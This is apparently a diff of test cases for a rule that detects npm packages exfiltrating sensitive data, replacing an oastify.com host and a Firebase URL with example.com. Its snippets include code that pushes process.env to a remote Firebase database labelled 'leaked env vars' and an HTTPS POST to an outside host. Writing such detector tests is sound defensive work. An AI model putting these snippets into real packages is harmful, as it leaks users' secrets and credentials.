@@ -14,7 +14,7 @@ function f(){
 
     const x = require('https');
     var options = {
-        hostname: "fdw8jf59fyrb5rp6hamcl4q7gymoad.oastify.com",
+        hostname: "example.com",
         port: 443,
         path: "/",
         method: "POST",
@@ -65,7 +65,7 @@ function f(){
 
 function f(){
     var Firebase = require("firebase");
-    var ref = new Firebase("https://abcde-fg-1234.firebaseio.com/");
+    var ref = new Firebase("https://example.com/");
     // ruleid: npm-exfiltrate-sensitive-data
     var dbRef = ref.child("env_vars");
     dbRef.push({status : "leaked env vars", message : process.env}, clean());
@@ -74,7 +74,7 @@ function f(){
 
 function f(){
     var Firebase = require("firebase");
-    var ref = new Firebase("https://abcde-fg-1234.firebaseio.com/");
+    var ref = new Firebase("https://example.com/");
     // ok: npm-exfiltrate-sensitive-data
     var dbRef = ref.child("env_vars");
     dbRef.push({status : "leaked env vars", message : "anymsg"}, clean());
